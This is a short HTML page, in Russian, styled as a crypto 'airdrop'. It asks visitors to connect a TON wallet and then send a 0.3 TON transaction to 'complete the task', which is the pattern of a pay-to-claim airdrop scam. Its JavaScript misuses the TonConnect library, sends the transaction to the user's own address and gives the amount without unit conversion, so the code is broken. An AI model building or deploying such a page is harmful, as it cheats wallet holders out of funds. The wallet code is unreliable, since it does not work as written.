<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Airdrop</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
      background-color: #f0f0f0;
      font-family: 'Poppins', sans-serif;
    }

    h1 {
      font-size: 36px;
      color: #ff0000;
      margin-bottom: 20px;
    }

    .task {
      width: 300px;
      padding: 20px;
      background-color: #ffffff;
      border: 2px solid #ff0000;
      margin-bottom: 20px;
      text-align: center;
      box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.2);
    }

    button {
      padding: 10px 20px;
      font-size: 16px;
      background-color: #ff5733;
      color: white;
      border: none;
      cursor: pointer;
      border-radius: 5px;
    }

    button:hover {
      background-color: #ff0000;
    }
  </style>
</head>
<body>

  <h1>AIRDROP</h1>

  <!-- Задание 1: Подключение криптовалютного кошелька -->
  <div class="task">
    <p>Подключите ваш криптовалютный кошелек для участия в airdrop.</p>
    <button onclick="connectWallet()">Подключить кошелек</button>
  </div>

  <!-- Задание 2: Транзакция 0.3 TON -->
  <div class="task">
    <p>Сделайте транзакцию для завершения задания.</p>
    <button onclick="makeTransaction()">Сделать транзакцию</button>
  </div>

  <!-- Подключение библиотеки Ton Connect -->
  <script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@latest"></script>

  <script>
    const tonConnect = new TonConnect();

    // Подключение кошелька
    function connectWallet() {
      tonConnect.connectWallet()
        .then(() => {
          alert("Кошелек успешно подключен!");
        })
        .catch(error => {
          console.error("Ошибка подключения кошелька", error);
        });
    }

    // Отправка транзакции 0.3 TON
    function makeTransaction() {
      const transactionDetails = {
        to: tonConnect.connectedWallet.account.address,
        value: 0.3, // Сумма в TON
      };

      tonConnect.sendTransaction(transactionDetails)
        .then(() => {
          alert("Транзакция успешно отправлена!");
        })
        .catch(error => {
          console.error("Ошибка при отправке транзакции", error);
        });
    }
  </script>

</body>
</html>
